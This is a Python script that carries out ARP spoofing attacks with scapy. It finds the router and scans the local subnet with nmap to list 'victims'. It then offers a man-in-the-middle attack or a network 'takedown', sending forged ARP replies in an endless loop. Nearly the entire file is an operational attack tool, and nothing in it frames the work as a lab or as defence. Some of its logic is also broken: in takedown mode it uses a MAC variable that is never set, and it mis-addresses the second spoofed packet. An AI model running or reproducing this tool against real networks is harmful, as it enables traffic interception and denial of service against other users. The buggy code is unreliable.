import subprocess, time

from scapy.layers.l2 import ARP
from scapy.sendrecv import send
import uuid
from victim import Victim
from attacker import Attacker
from network import Network
from color import Color #used to output to the terminals with colors


def initialize():
    Color.pl("{?} Doing pings to discover the router")
    time.sleep(2)

    subprocess.run(["ip", "neigh", "flush", "all"],shell=True) #clear arp table
    subprocess.run(["ping", "8.8.8.8", "-c", "1"]) #used to make sure the router has been added to the ARP table
    time.sleep(2)
    command = "arp -a"# neighbors table (ARP)
    out = str(subprocess.check_output(command, shell=True))
    
    commandOutput=out.split('\\r\\n')
    print(commandOutput)
    routerIP = commandOutput[3].split()[0]
    print(routerIP)
    routerMAC = commandOutput[3].split()[1]
    print(routerMAC)

    attackerIP = commandOutput[1].split()[1]
    attackerMAC = hex(uuid.getnode())
    print(attackerIP,attackerMAC)
    i=3
    while (i<len(commandOutput)):
        if commandOutput[i].split()[1]=='ff-ff-ff-ff-ff-ff':
            broadcastIP = commandOutput[i].split()[0]
            i=len(commandOutput)
        i+=1
            

    command = "nmap -sn "+ routerIP +"/24" # discover users connected to router
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT))
    connectedDevices = commandOutput.split('\\r\\n') #remove first element since it is the router
    print(connectedDevices)
    victimList = [] # list we are going to use and popsulate it with possible victims
    if len(connectedDevices)>5:
        for i in range(4, len(connectedDevices)-6, 3):
            mac = connectedDevices[i+2].split()[2]
            print(mac)
            ip = connectedDevices[i].split()[4]
            print(ip)
            if ip != attackerIP:
                print(ip, mac)
                victimList.append(Victim([ip, mac]))
    network = Network([routerIP, routerMAC, broadcastIP])
    attacker = Attacker([attackerIP, attackerMAC])
    return (network, attacker, victimList,broadcastIP)

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    takedown=False
    process= initialize()
    (network, attacker, victimsList,broadcastIP)=process
    Color.pl("{+} " + network.toString())
    Color.pl("{+} " + attacker.toString())
    for e in victimsList:
        Color.pl("{!} " + e.toString())

    op = 1  # Op code 1 for ARP requests
    while(True):
        Color.pl("{?} What type of ARP attack do you want to perform? \n (Man-in-the-middle[1] or Take down the network![2])")
        selection = input().lower()
        if selection.lower() == "2":
            ip=broadcastIP
            takedown=True
            routerIP = network.ip
            break
        else:
            if selection.lower()=="1":
                break
            else:
                Color.pl("{!} Invalid Input")
    while(takedown==False):
        Color.pl("{?} Do you want to enter the target manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter target IP address ")
            ip = input().strip()
            Color.pl("{+} Enter target MAC address ")
            mac = input().strip()
            break
        elif selection.lower() == "n":
            for i in range(len(victimsList)):
                Color.pl("{!} " + str(i) + ":   " + victimsList[i].toString())
            Color.pl("{+} Enter Index of Target")
            index = int(input())
            ip = victimsList[index].ip
            mac = victimsList[index].mac
            break
        else:
            Color.pl("{!} Invalid Input")

    while(takedown==False):
        Color.pl("{?} Do you want to enter the router IP manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter router IP address ")
            routerIP = input().strip()
            break
        elif selection.lower() == "n":
            routerIP = network.ip
            break
        else:
            Color.pl("{!} Invalid Input")

    Color.pl("{+} {R} Router IP: {G}" + routerIP)
    Color.pl("{+} {R} Target IP: {G}" + ip + "  {R} Target MAC: {G}" + mac)
    time.sleep(2)
    
    Color.pl("{+} Processing :) ")
    
    if (takedown==False):
        arp= ARP(op=2, psrc=routerIP, pdst=ip, hwdst=mac)
        arp2=ARP(op=2, psrc=ip, pdst=routerIP, hwdst=mac)
        
    else:
        arp = ARP(op=2, psrc=routerIP, pdst=ip, hwdst=mac)
            
    

    while 1:
        if (takedown==True):
            send(arp)
            print(mac)
        else:
            send(arp)
            send(arp2)
            
        time.sleep(5)


